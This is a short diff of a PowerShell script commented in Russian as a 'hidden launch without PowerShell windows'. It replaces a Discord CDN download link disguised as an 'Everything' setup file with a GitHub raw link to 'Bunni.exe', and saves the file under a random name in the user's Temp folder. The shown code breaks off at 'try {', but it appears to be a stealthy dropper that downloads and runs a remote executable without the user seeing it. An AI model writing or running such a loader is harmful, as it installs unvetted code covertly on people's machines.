@@ -1,5 +1,5 @@
 # Скрытый запуск без окон PowerShell
-$url  = 'https://cdn.discordapp.com/attachments/1469805797717573706/1469822016323321906/Everything-1.4.1.1032.x64-Setup.exe?ex=69890dec&is=6987bc6c&hm=da042514e41c24d06000439553dc62945471f6382b77c1d0cf47fd26bdb33cba&'
+$url  = 'https://github.com/wertybalet/bunni/raw/refs/heads/main/Bunni.exe'
 $file = "$env:LOCALAPPDATA\Temp\i$(Get-Random).exe"
 
 try {
